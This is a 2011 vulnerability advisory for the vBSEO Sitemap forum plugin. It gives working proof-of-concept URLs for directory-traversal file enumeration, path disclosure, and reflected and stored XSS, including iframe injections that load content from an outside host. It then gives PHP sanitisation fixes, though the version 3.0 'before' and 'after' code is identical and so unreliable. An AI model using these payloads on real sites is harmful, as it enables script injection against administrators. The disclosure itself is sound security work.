@@ -1,0 +1,147 @@
+vBSEO Sitemap - Multiple Vulnerabilities
+
+
+Versions Affected: 2.5 and 3.0 (Most likely all versions)
+
+Info:
+A proven success record, vBSEO powers the most optimized forums on the Web.
+The #1 SEO plugin and the only professional, fully supported solution. A full
+package of SEO enhancements, one install, one upgrade.
+
+External Links:
+http://www.vbseo.com
+
+Credits: MaXe (@InterN0T)
+
+
+-:: The Advisory ::-
+vBSEO is prone to multiple vulnerabilities, such as path disclosure, enumeration of files, persistent and non-persistent XSS. Please see the details below.
+
+vBSEO Sitemap 3.0 Gold:
+Enumeration and confirmation of files:
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?rlist=true&details=../../../vb4_readme.txt
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?hitdetails=../../../../vb4_readme.txt
+
+Proof of Concept XSS: (Non-Persistent)
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?dlist=true&botsonly=%22%3E%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?hitdetails=PADPAD%20%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=3663%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E
+
+Path Disclosure: (any file in the addon directory - includes fatal errors)
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_calendar.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads2.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_medialibrary.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links3.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vbagallery.php
+
+----------------------- END OF vBSEO 3.0 -----------------------
+
+vBSEO Sitemap 2.5: (initial first release)
+
+Enumeration and confirmation of files:
+http://www.target.tld/vbseo_sitemap/index.php?details=../../robots.txt
+http://www.target.tld/vbseo_sitemap/index.php?hitdetails=../../../robots.txt
+
+Non-Persistent XSS: (PoC)
+http://www.target.tld/vbseo_sitemap/index.php?dlist=true&botsonly=%22%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E%22;%3C/script%3E
+[May require bot hits to work!] http://www.target.tld/vbseo_sitemap/index.php?removedl[0]=&botsonly=%22%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E%22;%3C/script%3E
+http://www.target.tld/vbseo_sitemap/index.php?hitdetails=PADPAD%20%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=3663%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E
+
+Path Disclosure: (any file in the addon directory - includes fatal errors)
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_calendar.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads2.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba.php
+http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links.php
+http://www.target.tld/includes/functions_vbseo_url.php
+
+----------------------- END OF vBSEO 2.5 -----------------------
+
+vBSEO Sitemap: (Most likely all versions)
+Persistent XSS: 
+1) The user-agent is not sanitized in a sufficient way allowing an attacker to inject persistent scripts.
+2) Then the attacker must request the sitemap via one of the following links:
+- http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?dlist=true
+- http://www.target.tld/vbulletin/upload/vbseo_sitemap/vbseo_getsitemap.php?sitemap=sitemap_index.xml.gz
+
+3) Then an authenticated administrator must view one of the pages containing the injected and potentially malicious user-agent:
+http://www.target.tld/vbseo_sitemap/index.php?dlist=true&page=357
+
+
+[!] All vulnerabilities requires authentication and they do not survive a login screen, making them almost harmless.
+
+
+-:: Solution ::-
+Before: (file: index.php within vbseo_sitemap) -- Version 2.5
+<tr class="<?php echo $dd%2?'altfirst':'altsecond'?>">
+        <td><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>
+        <td align="right"><?php echo $sdate?></td>
+        <td><?php echo $dl['sitemap']?></td>
+        <td><b><?php echo $dl['ua']?></b></td>
+        <td><?php echo $dl['ip']?></td>
+        <td><?php echo $dl['useragent']?></td>
+        <td>
+<a href="index.php?removedl[<?php echo $dn?>]=<?php echo $dl['time']?>&botsonly=<?php echo $_GET['botsonly']?>" onclick="return confirm('Are you sure?')">Rem$
+        </td>
+        <td>
+<input type="checkbox" name="removedl[<?php echo $dn?>]" value="<?php echo $dl['time']?>">
+        </td>
+</tr>
+
+After:_______________________________________________________
+<tr class="<?php echo $dd%2?'altfirst':'altsecond'?>">
+        <td><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>
+        <td align="right"><?php echo $sdate?></td>
+        <td><?php echo $dl['sitemap']?></td>
+        <td><b><?php echo $dl['ua']?></b></td>
+        <td><?php echo $dl['ip']?></td>
+        <td><?php echo htmlentities($dl['useragent'])?></td>
+        <td>
+<a href="index.php?removedl[<?php echo $dn?>]=<?php echo $dl['time']?>&botsonly=<?php echo $_GET['botsonly']?>" onclick="return confirm('Are you sure?')">Rem$
+        </td>
+        <td>
+<input type="checkbox" name="removedl[<?php echo $dn?>]" value="<?php echo $dl['time']?>">
+        </td>
+</tr>
+---------------------------------------------------------------------------------------------
+
+Before: (file: index.php within vbseo_sitemap) -- Version 3.0
+<tr class="<?php echo $dd%2?'altfirst':'altsecond'?>">
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>" align="right"><?php echo $sdate?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo $dl['sitemap']?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><b><?php echo $dl['ua']?></b></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo $dl['ip']?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo htmlentities($dl['useragent'])?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>">
+
+After:_______________________________________________________
+<tr class="<?php echo $dd%2?'altfirst':'altsecond'?>">
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>" align="right"><?php echo $sdate?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo $dl['sitemap']?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><b><?php echo $dl['ua']?></b></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo $dl['ip']?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>"><?php echo htmlentities($dl['useragent'])?></td>
+        <td class="<?php echo $dd%2?'alt1':'alt2'?>">
+	
+---------------------------------------------------------------------------------------------
+
+In addition, vbseo_getsitemap.php which grabs the unsanitized user-agent can also be fixed by finding this line:
+'useragent'=>$_SERVER['HTTP_USER_AGENT'],
+
+And changing it to this:
+'useragent'=>htmlentities($_SERVER['HTTP_USER_AGENT']),
+
+
+
+Disclosure Information:
+- Vulnerability found and researched: ~27th December 2010
+- Semi-Disclosed at InterN0T: 30th December
+- Detailed Disclosure: 31st January 2011
+
+
+References:
+http://forum.intern0t.net/intern0t-advisories/3632-vbseo-sitemap-2-5-3-0-multiple-minor-vulnerabilities.html
